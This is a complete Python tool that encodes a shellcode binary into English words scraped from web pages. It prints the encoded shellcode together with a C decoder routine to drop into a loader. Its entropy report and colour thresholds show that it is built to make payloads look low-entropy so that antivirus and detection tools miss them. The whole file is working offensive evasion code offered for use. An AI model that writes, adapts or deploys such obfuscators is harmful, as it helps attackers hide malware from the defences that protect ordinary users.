import requests
from bs4 import BeautifulSoup
import random
import string
import sys
import math
from collections import Counter

GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"

# Add your selected urls 
TEXT_SOURCES = [
    "https://...",
    "https://...",
    "https://...",
    "https://..."
]

def load_shellcode(path):
    with open(path, "rb") as f:
        return list(f.read())

# Fetching urls for words, you better provide multiple urls to not get out of words
def extract_words(min_count):
    all_words = set()
    for url in TEXT_SOURCES:
        try:
            print(f"[*] Fetching: {url}")
            r = requests.get(url, timeout=5, verify=False)
            if "html" in r.headers.get("Content-Type", ""):
                soup = BeautifulSoup(r.text, "html.parser")
                text = soup.get_text()
            else:
                text = r.text
            words = text.lower().split()
            words = [w.strip(string.punctuation) for w in words if w.isalpha() and len(w) >= 3]
            all_words.update(words)
            if len(all_words) >= min_count:
                break
        except:
            continue
    return random.sample(list(all_words), min_count)

def build_bijective_mapping(byte_list, word_pool):
    unique_bytes = sorted(set(byte_list))
    if len(unique_bytes) > len(word_pool):
        raise ValueError("Not enough words for each uniq octet.")
    mapping = {b: w for b, w in zip(unique_bytes, word_pool)}
    reverse = {w: b for b, w in mapping.items()}
    return mapping, reverse

# simple shannon
def calculate_entropy(data):
    counter = Counter(data)
    total = len(data)
    return -sum((c / total) * math.log2(c / total) for c in counter.values())

# generate the loader sample
def generate_c_code(reverse_map, encoded_shellcode):
    word_table = list(reverse_map.keys())
    c = "// === BEGIN BAVARD BIJECTIVE ENCODING ===\n"

    c += "const char* encoded_shellcode[{}] = {{\n".format(len(encoded_shellcode))
    for i, w in enumerate(encoded_shellcode):
        if i % 8 == 0:
            c += "    "
        c += f'"{w}", '
        if (i + 1) % 8 == 0 or i == len(encoded_shellcode) - 1:
            c += "\n"
    c += "};\n\n"

    c += "typedef struct {\n    const char* word;\n    unsigned char byte;\n} DecodeEntry;\n\n"

    c += "DecodeEntry decode_table[] = {\n"
    for word, byte in reverse_map.items():
        c += f'    {{ "{word}", 0x{byte:02x} }},\n'
    c += "    { NULL, 0 }\n};\n"

    c += """
unsigned char* decode_shellcode() {
    int count = sizeof(encoded_shellcode) / sizeof(char*);
    unsigned char* result = (unsigned char*)malloc(count);
    for (int i = 0; i < count; i++) {
        for (int j = 0; ; j++) {
            if (decode_table[j].word == NULL) break;
            if (strcmp(encoded_shellcode[i], decode_table[j].word) == 0) {
                result[i] = decode_table[j].byte;
                break;
            }
        }
    }
    return result;
}
// === END BAVARD BIJECTIVE ENCODING ===
"""
    return c

def main():

    if len(TEXT_SOURCES) < 2 or all("https://..." in url for url in TEXT_SOURCES):
        print("[!] TEXT_SOURCES is not configured. Please provide at least 2 real URLs.")
        return

    if len(sys.argv) != 2:
        print("Usage: python bavard.py <shellcode.bin>")
        return

    shellcode_bytes = load_shellcode(sys.argv[1])
    unique_bytes = set(shellcode_bytes)
    word_pool = extract_words(len(unique_bytes))

    byte_to_word, word_to_byte = build_bijective_mapping(shellcode_bytes, word_pool)
    encoded = [byte_to_word[b] for b in shellcode_bytes]

    entropy = calculate_entropy(encoded)
    color = GREEN if entropy < 6.0 else YELLOW if entropy < 6.8 else RED
    print("\n[=] Entropy Report")
    print(f"    Unique words used: {len(set(encoded))}")
    print(f"    Encoded length: {len(encoded)}")
    print(f"    Entropy: {color}{entropy:.4f}{RESET}\n")

    print(generate_c_code(word_to_byte, encoded))

if __name__ == "__main__":
    main()

